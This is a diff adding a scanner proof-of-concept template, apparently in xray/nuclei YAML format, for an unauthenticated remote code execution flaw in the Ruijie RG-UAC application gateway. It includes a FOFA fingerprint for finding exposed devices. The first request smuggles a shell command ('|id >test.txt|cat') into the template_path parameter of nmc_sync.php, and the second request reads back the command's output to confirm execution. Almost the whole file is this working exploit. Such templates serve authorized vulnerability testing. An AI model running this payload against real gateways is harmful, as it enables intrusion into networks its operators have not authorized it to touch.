@@ -1,0 +1,28 @@
+id: poc-yaml-ruijie-rg-uac-rce
+info:
+  name: 锐捷RG-UAC应用网关 前台RCE漏洞复现
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: RG-UAC
+  fofa: app="Ruijie-RG-UAC"
+requests:
+- method: GET
+  path: /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|id%20>test.txt|cat
+  expression: 'status_code == 200 &&
+
+    contains(body,"IP_Strict") &&
+
+    contains(body,"alert(\"OK!\");")
+
+    '
+- method: GET
+  path: /view/systemConfig/management/test.txt
+  expression: 'status_code == 200 &&
+
+    matches(body,`uid=\d+\(\w+\)\s+gid=\d+\(\w+\)`) && !contains(body, "<")
+
+    '
+variables: {}
+transport: http
